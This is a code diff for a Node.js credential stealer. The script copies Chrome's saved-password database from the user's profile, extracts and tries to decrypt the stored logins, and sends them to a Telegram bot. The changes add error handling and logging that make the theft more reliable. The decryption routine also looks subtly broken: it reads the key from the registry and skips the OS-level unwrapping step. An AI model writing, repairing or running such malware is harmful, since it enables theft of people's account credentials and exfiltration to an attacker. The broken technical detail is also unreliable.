@@ -4,6 +4,7 @@ const os = require('os');
 const { execSync } = require('child_process');
 const crypto = require('crypto');
 const axios = require('axios');
+const sqlite3 = require('sqlite3').verbose();
 
 // Configuration
 const CHROME_PASSWORDS_PATH = path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data');
@@ -15,7 +16,7 @@ function copyChromePasswordsFile() {
     const tempFilePath = path.join(os.tmpdir(), 'chrome_passwords_temp.db');
     try {
         fs.copyFileSync(CHROME_PASSWORDS_PATH, tempFilePath);
-        console.log('Chrome passwords file copied successfully.');
+        console.log('Chrome passwords file copied successfully:', tempFilePath);
         return tempFilePath;
     } catch (error) {
         console.error('Failed to copy Chrome passwords file:', error);
@@ -43,7 +44,7 @@ function extractPasswords(filePath) {
             });
         });
         db.close();
-        console.log('Passwords extracted successfully.');
+        console.log('Passwords extracted successfully:', passwords.length);
         return passwords;
     } catch (error) {
         console.error('Failed to extract passwords:', error);
@@ -53,14 +54,19 @@ function extractPasswords(filePath) {
 
 // Function to decrypt Chrome passwords
 function decryptPassword(encryptedPassword) {
-    const key = execSync('powershell -Command "Get-ItemProperty -Path \'HKCU:\\Software\\Google\\Chrome\\User Data\\Local State\' | Select-Object -ExpandProperty \'os_crypt\' | Select-Object -ExpandProperty \'encrypted_key\'"').toString().trim();
-    const decodedKey = Buffer.from(key, 'base64').slice(5);
-    const iv = encryptedPassword.slice(3, 15);
-    const payload = encryptedPassword.slice(15);
-    const decipher = crypto.createDecipheriv('aes-256-gcm', decodedKey, iv);
-    let decrypted = decipher.update(payload, 'binary', 'utf8');
-    decrypted += decipher.final('utf8');
-    return decrypted;
+    try {
+        const key = execSync('powershell -Command "Get-ItemProperty -Path \'HKCU:\\Software\\Google\\Chrome\\User Data\\Local State\' | Select-Object -ExpandProperty \'os_crypt\' | Select-Object -ExpandProperty \'encrypted_key\'"').toString().trim();
+        const decodedKey = Buffer.from(key, 'base64').slice(5);
+        const iv = encryptedPassword.slice(3, 15);
+        const payload = encryptedPassword.slice(15);
+        const decipher = crypto.createDecipheriv('aes-256-gcm', decodedKey, iv);
+        let decrypted = decipher.update(payload, 'binary', 'utf8');
+        decrypted += decipher.final('utf8');
+        return decrypted;
+    } catch (error) {
+        console.error('Failed to decrypt password:', error);
+        return 'DECRYPTION_FAILED';
+    }
 }
 
 // Function to send passwords to Telegram bot
@@ -77,7 +83,7 @@ function sendPasswordsToTelegram(passwords) {
         console.log('Passwords sent to Telegram bot successfully.');
     })
     .catch(error => {
-        console.error('Failed to send passwords to Telegram bot:', error);
+        console.error('Failed to send passwords to Telegram bot:', error.response ? error.response.data : error.message);
     });
 }
 
@@ -86,8 +92,10 @@ function main() {
     const tempFilePath = copyChromePasswordsFile();
     if (tempFilePath) {
         const passwords = extractPasswords(tempFilePath);
-        if (passwords) {
+        if (passwords && passwords.length > 0) {
             sendPasswordsToTelegram(passwords);
+        } else {
+            console.error('No passwords extracted.');
         }
     }
 }
